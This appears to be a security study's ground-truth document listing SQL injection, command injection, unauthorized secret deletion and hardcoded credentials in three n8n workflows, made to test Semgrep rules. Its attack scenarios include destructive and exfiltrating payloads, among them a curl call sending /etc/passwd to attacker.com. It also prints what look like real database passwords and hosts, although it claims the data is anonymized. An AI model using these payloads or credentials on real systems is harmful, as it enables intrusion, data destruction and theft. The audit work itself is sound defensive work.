# Ground Truth Documentation for n8n Workflow Vulnerabilities

This document provides detailed documentation of known vulnerabilities in the three n8n workflows analyzed for this study. This serves as the "ground truth" dataset for validating the effectiveness of Semgrep rules.

## Dataset Overview

- **Total Workflows**: 3
- **Total Vulnerabilities Documented**: 11 instances across 6 classes
- **Purpose**: Validation of Semgrep rule detection capabilities

---

## Workflow 1: Delete project (workflow_1.json)

### File Information
- **Workflow ID**: A3mEyGqsRYXLmP1t
- **Workflow Name**: Delete project
- **Total Nodes**: 67
- **File Size**: 2650 lines

### PRIMARY VULNERABILITIES

#### Vulnerability 1.1: Unauthorized Secret Deletion (Critical)

**Node ID**: `65d54b6d-25d7-477a-b448-fe5e4f4d6175`
**Node Name**: Delete non-sensitive Secret
**Node Type**: `n8n-nodes-base.httpRequest`
**Lines**: 1733-1756

**Description**:
HTTP DELETE request to Vault secret management system with dynamically constructed URL using workflow input data without authorization checks or approval workflows.

**Vulnerable Code Pattern**:
```json
{
  "parameters": {
    "method": "DELETE",
    "url": "=https://vault-hcp.agriness.com/v1/{{ $json.environment }}/metadata/{{ $('Input data').item.json[\"squad_default\"] }}/non-sensitive/{{ $('Input data').item.json.name }}",
    "authentication": "genericCredentialType",
    "genericAuthType": "httpHeaderAuth"
  }
}
```

**Injection Points**:
- `$json.environment` - Environment name injected into URL path
- `$('Input data').item.json["squad_default"]` - Squad/namespace injected
- `$('Input data').item.json.name` - Project name injected

**OWASP Category**: LCNC-SEC-07 (Security Misconfiguration)
**CWE**: CWE-285 (Improper Authorization)
**Severity**: CRITICAL

**Why It's Vulnerable**:
- No multi-factor approval required for secret deletion
- No audit trail or rollback capability
- URL constructed directly from user input without validation
- Single workflow execution can permanently delete production secrets
- Lacks principle of least privilege enforcement

**Mitigation**:
- Implement approval workflow with multiple stakeholders
- Add mandatory audit logging with immutable records
- Implement time-delayed execution with cancellation window
- Require explicit confirmation of secret name to prevent typos
- Use separate credentials with delete-only permissions

---

#### Vulnerability 1.2: Unauthorized Secret Deletion - Sensitive (Critical)

**Node ID**: `b6d1d527-f1ce-4fa3-bae0-fbd975832844`
**Node Name**: Delete sensitive Secret
**Node Type**: `n8n-nodes-base.httpRequest`
**Lines**: 1757-1780

**Description**:
Identical to 1.1 but targets sensitive secrets path, making it even more critical.

**Vulnerable Code Pattern**:
```json
{
  "parameters": {
    "method": "DELETE",
    "url": "=https://vault-hcp.agriness.com/v1/{{ $json.environment }}/metadata/{{ $('Input data').item.json[\"squad_default\"] }}/sensitive/{{ $('Input data').item.json.name }}"
  }
}
```

**OWASP Category**: LCNC-SEC-07 (Security Misconfiguration)
**CWE**: CWE-285 (Improper Authorization), CWE-522 (Insufficiently Protected Credentials)
**Severity**: CRITICAL

**Mitigation**: Same as 1.1 plus:
- Require even stricter approval for sensitive secret deletion
- Implement mandatory backup before deletion
- Send real-time alerts to security team

---

### ADDITIONAL CHECKS (Workflow 1)

#### Check 1.3: Potential SSRF

**Finding**: No direct SSRF vulnerability detected.
**Rationale**: HTTP requests in this workflow target fixed domain (`vault-hcp.agriness.com`) only. While URL path is dynamic, the domain is hardcoded, preventing classic SSRF attacks.

**Nodes Examined**:
- `Delete non-sensitive Secret` (lines 1733-1756)
- `Delete sensitive Secret` (lines 1757-1780)
- Various GitHub API calls (all use fixed URLs)

---

#### Check 1.4: Insecure Data Handling

**Finding**: Potentially present but low severity in this workflow.
**Node**: Multiple HTTP Request nodes
**Issue**: Some HTTP nodes may transmit data over connections without explicit TLS verification, though target URLs use HTTPS.

**Status**: INFORMATIONAL - All URLs use HTTPS scheme, but explicit TLS certificate validation not verified.

---

#### Check 1.5: Denial of Service (DoS)

**Finding**: Potential DoS through recursive workflow execution.
**Evidence**: Complex connection graph with multiple conditional branches could lead to infinite loops if misconfigured.

**Status**: LOW - Would require specific misconfiguration; not immediately exploitable.

---

## Workflow 2: Massive n8n workflow (workflow_2.json)

### File Information
- **Workflow ID**: [Need to extract from file]
- **Workflow Name**: [Complex workflow with multiple database queries]
- **Total Nodes**: 100+
- **File Size**: 2945 lines

### PRIMARY VULNERABILITIES

#### Vulnerability 2.1: SQL Injection in Service Query (Critical)

**Node ID**: `35c32aa1-9c6f-45db-aa1f-cb90f7f9bd8b`
**Node Name**: SQL SERVICE
**Node Type**: `n8n-nodes-base.set`
**Lines**: 670-692

**Description**:
Complex SQL query with multiple dynamic expression injections directly concatenated into SQL without parameterization.

**Vulnerable Code Pattern**:
```sql
SELECT ... FROM {{ $json.data.schema_name }}.animaldetail ad
WHERE ae.farm_id={{ $json.data.farm_id }}
AND a.reproductive_stage_id = {{ $json.params.reproductive_stages.open_sow_id }}
AND (cast(now() as date)-cast(ae.last_event_date as date))>= {{ $json.params.opened_days_from }}
ORDER BY CASE WHEN '{{ $json.params.order_by }}'='DATE' THEN ...
```

**Injection Points**:
1. `{{ $json.data.schema_name }}` - Schema name directly in FROM clause
2. `{{ $json.data.farm_id }}` - Farm ID in WHERE clause (multiple occurrences)
3. `{{ $json.params.reproductive_stages.open_sow_id }}` - Reproductive stage ID
4. `{{ $json.params.opened_days_from }}` - Numeric parameter in comparison
5. `{{ $json.params.opened_days_to }}` - Numeric parameter in comparison
6. `{{ $json.params.order_by }}` - String parameter in CASE/ORDER BY

**OWASP Category**: LCNC-SEC-06 (Injection Flaws)
**CWE**: CWE-89 (SQL Injection)
**Severity**: CRITICAL

**Attack Scenarios**:
1. **Schema injection**: `$json.data.schema_name` could be set to `public; DROP TABLE users; --`
2. **Boolean-based blind SQLi**: Manipulate farm_id to extract data: `1 OR 1=1--`
3. **Time-based blind SQLi**: Use SLEEP() or pg_sleep() in numeric parameters
4. **UNION-based SQLi**: Inject UNION SELECT to extract data from other tables

**Mitigation**:
- Use parameterized queries with PostgreSQL node's native parameter binding
- Validate and whitelist schema_name against known schemas
- Cast numeric inputs explicitly: `CAST({{ $json.data.farm_id }} AS INTEGER)`
- Use prepared statements for dynamic table/schema names
- Implement input validation layer before SQL construction

---

#### Vulnerability 2.2: SQL Injection in Farrowing Query (Critical)

**Node ID**: `9b2be544-1513-4e83-bba1-b12ee48e2200`
**Node Name**: SQL FARROWING
**Node Type**: `n8n-nodes-base.set`
**Lines**: 693-715

**Description**:
Similar pattern to 2.1 with multiple unparameterized dynamic expressions in SQL query.

**Vulnerable Code Pattern**:
```sql
WHERE a.farm_id={{ $json.data.farm_id }}
AND a.reproductive_stage_id = {{ $json.params.reproductive_stages.pregnant_id }}
AND (cast(now() as date)-cast(ae.last_event_date as date))>={{ $json.params.gestation_days_from }}
```

**Injection Points**:
1. `{{ $json.data.farm_id }}` - Multiple occurrences
2. `{{ $json.params.reproductive_stages.pregnant_id }}`
3. `{{ $json.params.gestation_days_from }}`
4. `{{ $json.params.gestation_days_to }}`
5. `{{ $json.params.order_by }}`

**OWASP Category**: LCNC-SEC-06 (Injection Flaws)
**CWE**: CWE-89 (SQL Injection)
**Severity**: CRITICAL

**Mitigation**: Same as 2.1

---

#### Vulnerability 2.3: SQL Injection in Lactating Query (Critical)

**Node ID**: `b859f1a8-23c3-4dcd-b8e6-a6ffc5595d89`
**Node Name**: SQL FARROWING1
**Node Type**: `n8n-nodes-base.set`
**Lines**: ~900-920 (estimated)

**Description**:
Third instance of the same SQL injection pattern for lactating animal queries.

**OWASP Category**: LCNC-SEC-06 (Injection Flaws)
**CWE**: CWE-89 (SQL Injection)
**Severity**: CRITICAL

---

### ADDITIONAL CHECKS (Workflow 2)

#### Check 2.4: SSRF

**Finding**: No SSRF vulnerability detected.
**Rationale**: All database connections use PostgreSQL node with credential-based authentication. No HTTP requests with user-controllable URLs found.

---

#### Check 2.5: Insecure Data Handling

**Finding**: Potential exposure of sensitive agricultural data in logs.
**Severity**: MEDIUM

**Issue**: Workflow processes potentially sensitive farm data (animal records, farm identifiers) with verbose logging. No explicit PII redaction observed.

---

#### Check 2.6: Denial of Service

**Finding**: Potential DoS through unbounded SQL queries.
**Evidence**: `generate_series(1, 1000)` creates 1000 rows that could be joined with large datasets, leading to performance issues.

**Severity**: LOW-MEDIUM

---

## Workflow 3: Dump/Restore CloudSQL Databases (workflow_3.json)

### File Information
- **Workflow ID**: UPowV6KEfvltkNw9
- **Workflow Name**: Dump/Restore of CloudSQL Databases
- **Total Nodes**: 17
- **File Size**: 605 lines

### PRIMARY VULNERABILITIES

#### Vulnerability 3.1: Command Injection via SSH (Critical)

**Node ID**: `67e9c522-766d-4611-a52f-a88a92f07a7f`
**Node Name**: Dump1
**Node Type**: `n8n-nodes-base.ssh`
**Lines**: 266-286

**Description**:
SSH command execution with database credentials passed directly in command string, enabling command injection.

**Vulnerable Code Pattern**:
```json
{
  "parameters": {
    "command": "=PGPASSWORD=\"{{ $json.source.password }}\" pg_dump -U {{ $json.source.username }} -h {{ $json.source.host }} -p {{ $json.source.port }} --no-owner --no-privileges {{ $json.source.database }} > /tmp/backup_{{ $json.source.database }}.sql "
  }
}
```

**Injection Points**:
1. `{{ $json.source.password }}` - Command injection in PGPASSWORD environment variable
2. `{{ $json.source.username }}` - Username parameter
3. `{{ $json.source.host }}` - Hostname parameter
4. `{{ $json.source.port }}` - Port parameter
5. `{{ $json.source.database }}` - Database name (2 occurrences)

**OWASP Category**: LCNC-SEC-06 (Injection Flaws)
**CWE**: CWE-78 (OS Command Injection)
**Severity**: CRITICAL

**Attack Scenarios**:
1. **Password injection**: `password"; rm -rf / #` could execute arbitrary commands
2. **Database name injection**: `dbname; curl attacker.com/exfiltrate?data=$(cat /etc/passwd) #`
3. **Chained commands**: Using semicolons, pipes, or command substitution

**Mitigation**:
- Use PostgreSQL node with proper credential management instead of shell commands
- If shell required, properly escape all variables using shell-safe functions
- Use environment files instead of inline PGPASSWORD
- Validate inputs against strict whitelists (alphanumeric only for identifiers)

---

#### Vulnerability 3.2: Command Injection via SSH - Restore (Critical)

**Node ID**: `59174496-27b4-4b4a-8f74-8688acb26897`
**Node Name**: Restore1
**Node Type**: `n8n-nodes-base.ssh`
**Lines**: 287-307

**Description**:
Identical pattern to 3.1 but for restore operation, equally vulnerable.

**Vulnerable Code Pattern**:
```json
{
  "parameters": {
    "command": "=PGPASSWORD=\"{{ $('loop').item.json.target.password }}\" psql -U {{ $('loop').item.json.target.username }} -h {{ $('loop').item.json.target.host }} -p {{ $('loop').item.json.target.port }} -d {{ $('loop').item.json.target.database }} -f /tmp/backup_{{ $('loop').item.json.target.database }}.sql\n"
  }
}
```

**OWASP Category**: LCNC-SEC-06 (Injection Flaws)
**CWE**: CWE-78 (OS Command Injection)
**Severity**: CRITICAL

---

#### Vulnerability 3.3: Secret Sprawl - Hardcoded Database Credentials (Critical)

**Node ID**: `2680c7a5-5feb-4d56-90a7-a0dd9623ece7`
**Node Name**: db Info
**Node Type**: `n8n-nodes-base.set`
**Lines**: 337-351

**Description**:
Database passwords and connection strings hardcoded directly in workflow configuration JSON.

**Vulnerable Code Pattern**:
```json
{
  "parameters": {
    "jsonOutput": "{\n  \"databases\": [\n    {\n      \"source\": {\n        \"username\": \"map\",\n        \"password\": \"Rsx5AeIKKy671F\",\n        \"host\": \"34.151.230.33\",\n        \"port\": \"5432\",\n        \"database\": \"db-map\"\n      },\n      \"target\": {\n        \"username\": \"map\",\n        \"password\": \"3g4Tmn43IuS4\",\n        \"host\": \"postgres-qa.agriness-qa.com\",\n        \"port\": \"5432\",\n        \"database\": \"map_db\"\n      }\n    }\n  ]\n}"
  }
}
```

**Exposed Secrets**:
1. Source database password: `Rsx5AeIKKy671F`
2. Target database password: `3g4Tmn43IuS4`
3. Source database IP: `34.151.230.33`
4. Target database host: `postgres-qa.agriness-qa.com`

**OWASP Category**: LCNC-SEC-07 (Security Misconfiguration)
**CWE**: CWE-798 (Hard-coded Credentials), CWE-312 (Cleartext Storage of Sensitive Information)
**Severity**: CRITICAL

**Why It's Vulnerable**:
- Credentials stored in plaintext in version control
- Accessible to anyone with workflow export permissions
- No secrets rotation mechanism
- Credentials likely reused across environments
- Exposed in workflow execution logs

**Mitigation**:
- Use n8n's Credentials feature to store passwords securely
- Reference credentials via `{{ $credentials.database }}` syntax
- Implement secrets rotation policy
- Use dedicated service accounts with minimal privileges
- Enable audit logging for credential access

---

#### Vulnerability 3.4: Secret Sprawl - SSH Private Key Exposure (High)

**Node ID**: Multiple (Dump1, Restore1)
**Credentials Referenced**: `wLbLxDyj0E3bvxgM` (ids-ssh-admin-private-key)

**Description**:
SSH commands executed using shared private key credential. While not directly hardcoded in this workflow, the key name suggests it's an admin-level key with broad access.

**OWASP Category**: LCNC-SEC-07 (Security Misconfiguration)
**CWE**: CWE-266 (Incorrect Privilege Assignment)
**Severity**: HIGH

**Mitigation**:
- Use dedicated SSH keys per workflow/purpose
- Implement principle of least privilege
- Regular key rotation schedule

---

#### Vulnerability 3.5: Secret Exposure in VM Metadata (Medium)

**Node ID**: `f146ab60-0ca8-415e-aa67-4e78bd54873e`
**Node Name**: vm Info
**Lines**: 308-322

**Description**:
SSH public key embedded in VM startup script metadata.

**Vulnerable Code Pattern** (line 312):
```json
{
  "key": "ssh-keys",
  "value": "ids_admin:ssh-rsa AAAAB3NzaC1yc2EAAA..."
}
```

**OWASP Category**: LCNC-SEC-07 (Security Misconfiguration)
**Severity**: MEDIUM (public keys less sensitive, but still exposes infrastructure details)

---

### ADDITIONAL CHECKS (Workflow 3)

#### Check 3.6: SSRF

**Finding**: Potential SSRF in HTTP requests to GCP APIs.
**Severity**: LOW

**Evidence**:
- Node "Create VM" (lines 210-226) uses dynamic URL from workflow data: `{{ $json.CREATE_VM.url }}`
- Node "Delete VM" (lines 228-250) constructs URL dynamically

**Status**: LOW - URLs appear to be constructed from trusted workflow configuration, not external input. However, if workflow configuration is modifiable by untrusted users, this could be escalated.

---

#### Check 3.7: Insecure Data Handling

**Finding**: HTTP requests to GCP APIs use HTTPS with OAuth2.
**Status**: SECURE - Proper authentication and encryption observed.

---

#### Check 3.8: Denial of Service

**Finding**: No obvious DoS vulnerabilities.
**Status**: CLEAR

---

## Summary Statistics

| Workflow | Critical | High | Medium | Low | Total |
|----------|----------|------|--------|-----|-------|
| Workflow 1 | 2 | 0 | 0 | 1 | 3 |
| Workflow 2 | 3 | 0 | 1 | 1 | 5 |
| Workflow 3 | 3 | 1 | 1 | 1 | 6 |
| **TOTAL** | **8** | **1** | **2** | **3** | **14** |

## Vulnerability Class Coverage

| Class | Present | Workflows | Count |
|-------|---------|-----------|-------|
| SQL Injection | ✓ | Workflow 2 | 3 |
| Command Injection | ✓ | Workflow 3 | 2 |
| Secret Sprawl | ✓ | Workflow 3 | 3 |
| Unauthorized Operations | ✓ | Workflow 1 | 2 |
| SSRF | ✓ (low severity) | Workflow 3 | 1 |
| Insecure Data Handling | ✓ (informational) | Workflows 1, 2 | 2 |
| DoS | ✓ (low severity) | Workflows 1, 2 | 2 |

---

## Expected Semgrep Detection Targets

For validation, Semgrep rules should detect AT MINIMUM:

### Must Detect (Critical - True Positives Required):
1. Workflow 1, Vulnerabilities 1.1 & 1.2 (DELETE to Vault)
2. Workflow 2, Vulnerabilities 2.1, 2.2, 2.3 (SQL Injection)
3. Workflow 3, Vulnerabilities 3.1, 3.2 (Command Injection)
4. Workflow 3, Vulnerability 3.3 (Hardcoded Credentials)

### Should Detect (High Priority):
5. Workflow 3, Vulnerability 3.4 (SSH Key Exposure)

### May Detect (Lower Priority):
6. Workflow 1, Check 1.5 (DoS potential)
7. Workflow 2, Check 2.6 (SQL DoS)
8. Workflow 3, Check 3.6 (SSRF potential)

---

## Document Metadata

- **Created**: 2025-01-24
- **Author**: João Pedro Schmidt Cordeiro
- **Purpose**: Ground truth for Semgrep SAST validation study
- **Dataset**: 3 production n8n workflows (anonymized)
- **Total Documented Vulnerabilities**: 14 instances
- **Critical Vulnerabilities**: 8
- **Validation Approach**: Manual security code review with OWASP LCNC Top 10 framework
